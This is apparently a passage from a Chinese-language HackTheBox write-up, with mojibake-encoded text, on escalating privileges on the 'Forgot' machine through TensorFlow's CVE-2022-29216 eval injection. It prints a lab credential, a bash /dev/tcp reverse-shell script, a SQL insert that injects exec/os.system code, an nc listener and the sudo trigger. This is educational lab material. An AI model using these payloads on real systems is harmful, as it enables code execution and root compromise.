        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'layer'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'applet'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'marquee'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for malicious method count</span>
        feature2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'fromcharcode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'eval'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'alert'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'getelementsbytagname'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'unescape'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'escape'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'prompt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'onload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'onclick'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'onerror'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'onpage'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'confirm'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for ".js" count</span>
        feature3 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'.js'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for "javascript" count</span>
        feature4 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'javascript'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for length of the string</span>
        feature5 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for "&lt;script"  count</span>
        feature6 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature6 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'&lt;script'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature6 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'&amp;lt;script'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature6 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'%3cscript'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature6 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'%3c%73%63%72%69%70%74'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for special character count</span>
        feature7 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'%3C'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for http count</span>
        feature8 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        <span class="token comment"># append the features</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature1<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature2<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature3<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature4<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature5<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature6<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature7<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature8<span class="token punctuation">)</span>
        features<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">)</span>
    <span class="token keyword">return</span> features

<span class="token comment"># Grab links</span>
conn <span class="token operator">=</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">'app'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'diego'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'dCb#1!x0%gjq'</span><span class="token punctuation">)</span>
cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'select reason from escalate'</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> r<span class="token punctuation">:</span>
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
Xnew <span class="token operator">=</span> getVec<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token comment">#1 DecisionTreeClassifier</span>
ynew1 <span class="token operator">=</span> loaded_model1<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>
<span class="token comment">#2 SVC</span>
ynew2 <span class="token operator">=</span> loaded_model2<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>
<span class="token comment">#3 GaussianNB</span>
ynew3 <span class="token operator">=</span> loaded_model3<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>
<span class="token comment">#4 KNeighborsClassifier</span>
ynew4 <span class="token operator">=</span> loaded_model4<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>
<span class="token comment">#5 RandomForestClassifier</span>
ynew5 <span class="token operator">=</span> loaded_model5<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>
<span class="token comment">#6 MLPClassifier</span>
ynew6 <span class="token operator">=</span> loaded_model6<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>

<span class="token comment"># show the sample inputs and predicted outputs</span>
<span class="token keyword">def</span> <span class="token function">assessData</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">.175</span><span class="token operator">*</span>ynew1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">.15</span><span class="token operator">*</span>ynew2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">.05</span><span class="token operator">*</span>ynew3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">.075</span><span class="token operator">*</span>ynew4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">.25</span><span class="token operator">*</span>ynew5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">.3</span><span class="token operator">*</span>ynew6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> score <span class="token operator">&gt;=</span> <span class="token number">.5</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
                preprocess_input_exprs_arg_string<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>safe<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
                <span class="token keyword">pass</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>assessData<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#     t.daemon = True</span>
     t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åˆ†æä¸€ä¸‹ä»£ç åŠŸèƒ½</p>
<ol>
<li>ä»appæ•°æ®åº“escalateè¡¨çš„reasonåˆ—å–å€¼ï¼ˆä»£ç 112-121è¡Œï¼‰ï¼Œå°†æ­¤å€¼ä½œä¸ºè¾“å…¥ï¼ŒåŒ¹é…å…¶ä¸­çš„ç‰¹å¾å­—æ®µï¼ˆä»£ç 45-98è¡Œçš„featureï¼‰ä½œä¸ºç‰¹å¾å‘é‡ï¼ˆä¸å¿…çº ç»“ç‰¹å¾å‘é‡æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼‰</li>
<li>ç„¶åç”¨è‹¥å¹²ç§æœºå™¨å­¦ä¹ æ¨¡å‹ï¼ˆä»£ç 123-134è¡Œï¼‰å»é¢„æµ‹è¾“å‡º</li>
<li>æœ€åå¯¹è¾“å‡ºæŠŠè¾“å…¥å’Œè¾“å‡ºéƒ½åºåˆ—åŒ–æˆæŸç§æ•°æ®æ ¼å¼ï¼ˆä»£ç 136-148ï¼Œè¿™é‡Œçš„æ•°æ®æ ¼å¼ä¸å¿…è¿‡åˆ†çº ç»“ï¼Œä¼°è®¡æ˜¯ä¸ºäº†çœ‹ç€æ–¹ä¾¿ï¼‰</li>
</ol>
<p><strong>æ³¨æ„</strong>ï¼šæœ‰ä¸ªå‰æï¼ŒåŒ¹é…åˆ°äº†ç›¸å…³ç‰¹å¾å­—æ®µï¼Œæ‰ä¼šæœ‰å¯èƒ½æ»¡è¶³åºåˆ—åŒ–æ•°æ®çš„æ¡ä»¶ï¼ˆå…·ä½“å¯çœ‹scoreå‚æ•°çš„ä¼ é€’é“¾ï¼‰ï¼Œæ‰ä¼šæ‰§è¡Œç¬¬3æ­¥ï¼Œä»è€Œæ‰ä¼šå»æ‰§è¡Œ<code>preprocess_input_exprs_arg_string(data[i],safe=False)</code></p>
<p>é‚£ä¹ˆæœ‰è¿æ¥æ•°æ®åº“çš„æ“ä½œï¼Œç”¨æˆ·åå¯†ç ä¾ç„¶æ˜¯diegoçš„ç”¨æˆ·åå¯†ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307153941609.png"></p>
<p>é—®é¢˜å°±å‡ºç°åœ¨<code>preprocess_input_exprs_arg_string(data[i],safe=False)</code>ï¼Œgoogleæœäº†ä¸€ä¸‹ï¼Œæ˜¯CVE-2022-29216ï¼Œå¯ä»¥ä»£ç æ³¨å…¥</p>
<p>å‚è€ƒ<a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></p>
<p>ç¨å¾®åˆ†æä¸€ä¸‹è¿™ä¸ªCVEåŸç†ï¼Œä¸‹é¢ä»£ç æ®µæ˜¯å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ï¼ˆtensorflow2.6.3ï¼‰<code>preprocess_input_exprs_arg_string()</code>å‡½æ•°çš„æºç ï¼Œä¸»è¦é—®é¢˜å°±åœ¨äºsafeå‚æ•°å¦‚æœè®¾ä¸ºfalseï¼Œé‚£ä¹ˆç¬¬12è¡Œåˆ¤æ–­<code>if safe</code>å°±ä¼šè¿”å›å¸ƒå°”0ï¼Œä»è€Œè·³è½¬åˆ°18è¡Œ<code>else</code>ï¼Œç„¶åæ‰§è¡Œ<code>eval(expr)</code>ï¼Œåˆ†æ<code>expr</code>å‚æ•°ä¼ é€’è·¯çº¿ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œäº†<code>input_exprs_str</code>ç¬¬ä¸€ä¸ªç­‰å·åçš„è¡¨è¾¾å¼</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">preprocess_input_exprs_arg_string</span><span class="token punctuation">(</span>input_exprs_str<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token triple-quoted-string string">"""
  ......
  """</span>
  input_dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

  <span class="token keyword">for</span> input_raw <span class="token keyword">in</span> <span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">,</span> input_exprs_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'='</span> <span class="token keyword">not</span> <span class="token keyword">in</span> input_exprs_str<span class="token punctuation">:</span>
      <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'--input_exprs "%s" format is incorrect. Please follow'</span>
                         <span class="token string">'"&lt;input_key&gt;=&lt;python expression&gt;"'</span> <span class="token operator">%</span> input_exprs_str<span class="token punctuation">)</span>
    input_key<span class="token punctuation">,</span> expr <span class="token operator">=</span> input_raw<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> safe<span class="token punctuation">:</span>
      <span class="token keyword">try</span><span class="token punctuation">:</span>
        input_dict<span class="token punctuation">[</span>input_key<span class="token punctuation">]</span> <span class="token operator">=</span> ast<span class="token punctuation">.</span>literal_eval<span class="token punctuation">(</span>expr<span class="token punctuation">)</span>
      <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>
            <span class="token string-interpolation"><span class="token string">f'Expression "</span><span class="token interpolation"><span class="token punctuation">{</span>expr<span class="token punctuation">}</span></span><span class="token string">" is not a valid python literal.'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      <span class="token comment"># ast.literal_eval does not work with numpy expressions</span>
      input_dict<span class="token punctuation">[</span>input_key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span>  <span class="token comment"># pylint: disable=eval-used</span>
  <span class="token keyword">return</span> input_dict<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç»¼ä¸Šåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥åœ¨appæ•°æ®åº“escalateè¡¨çš„reasonåˆ—æ’å…¥ä¸€ä¸ªé”®å€¼å¯¹ï¼ˆa=bæ ¼å¼ï¼‰ï¼Œé”®åç§°ä»»æ„ï¼Œå€¼ä¸ºæ„é€ å¥½çš„pythonä»£ç ï¼ˆå› ä¸ºæœ€ç»ˆæ˜¯ä»£å…¥åˆ°<code>/opt/security/ml_security.py</code>æ–‡ä»¶æ‰§è¡Œï¼‰ï¼Œå…¶ä¸­åŒ…å«æ‰§è¡Œåå¼¹shellæ–‡ä»¶çš„ä»£ç ï¼Œä¸”åŒ…å«åˆšæ‰åˆ†ææ‰€æåˆ°çš„ç‰¹å¾å­—æ®µçš„ä»»æ„ä¸€ä¸ªï¼Œç¤ºä¾‹å¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">hello=exec("""\nimport os\nos.system("/tmp/wa0er_rev.sh")\nprint("%3CSCRIPT%3Ealert%28%22wa0er%22%29%3C/SCRIPT%3E")""")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¼€å§‹æ“ä½œï¼Œçœ‹ä¸€ä¸‹tensorflowçš„ç‰ˆæœ¬æ˜¯2.6.3ï¼Œæ˜¯æ¼æ´å­˜åœ¨çš„ç‰ˆæœ¬</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">diego@forgot:~$ pip show tensorflow
Name: tensorflow
Version: 2.6.3
Summary: TensorFlow is an open source machine learning framework for everyone.
Home-page: https://www.tensorflow.org/
Author: Google Inc.
Author-email: packages@tensorflow.org
License: Apache 2.0
Location: /usr/local/lib/python3.8/dist-packages
Requires: keras, h5py, grpcio, tensorflow-estimator, termcolor, opt-einsum, six, keras-preprocessing, protobuf, tensorboard, absl-py, google-pasta, wrapt, wheel, flatbuffers, typing-extensions, gast, astunparse, numpy, clang
Required-by:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨/tmpç›®å½•å†™ä¸€ä¸ªåå¼¹shellæ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">diego@forgot:~$ vim /tmp/wa0er_rev.sh
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/[æœ¬åœ°IP]/[æœ¬åœ°PORT] 0&gt;&amp;1
diego@forgot:~$ chmod +x /tmp/wa0er_rev.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿æ¥mysql</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307155647494.png"></p>
<p>è¿›åˆ°appæ•°æ®åº“</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307161028629.png"></p>
<p>æ‰§è¡Œå¦‚ä¸‹sqlè¯­å¥ï¼Œåœ¨escalateè¡¨é‡Œæ’å…¥å†…å®¹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">insert into escalate values ("wa0er","wa0er","wa0er",'hello=exec("""\nimport os\nos.system("/tmp/wa0er_rev.sh")\nprint("%3CSCRIPT%3Ealert%28%22wa0er%22%29%3C/SCRIPT%3E")""")');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯ä»¥çœ‹åˆ°ç¬¬å››åˆ—reasonæœ‰æˆ‘ä»¬æ³¨å…¥çš„ä»£ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230308112536633.png"></p>
<p>å¼€å¯ncç›‘å¬</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp [PORT]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‰§è¡Œè„šæœ¬</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo /opt/security/ml_security.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230308112658540.png"></p>
<p>æ‹¿åˆ°rootï¼ŒOverï¼</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307162318369.png"></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307161312862.png" style="zoom:67%;">

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://0xdf.gitlab.io/2023/03/04/htb-forgot.html">https://0xdf.gitlab.io/2023/03/04/htb-forgot.html</a></p>
<p><a href="https://infosecwriteups.com/forgot-hack-the-box-walkthrough-htb-e571fd151f9a">https://infosecwriteups.com/forgot-hack-the-box-walkthrough-htb-e571fd151f9a</a></p>
<p><a href="https://www.usenix.org/conference/usenixsecurity20/presentation/mirheidari">https://www.usenix.org/conference/usenixsecurity20/presentation/mirheidari</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>varnishåå‘ä»£ç†ç¼“å­˜</tag>
        <tag>é‡ç½®å¯†ç åŠŸèƒ½æŠ•æ¯’</tag>
        <tag>CVE-2022-29216ï¼ˆå‘½ä»¤æ‰§è¡Œï¼‰</tag>
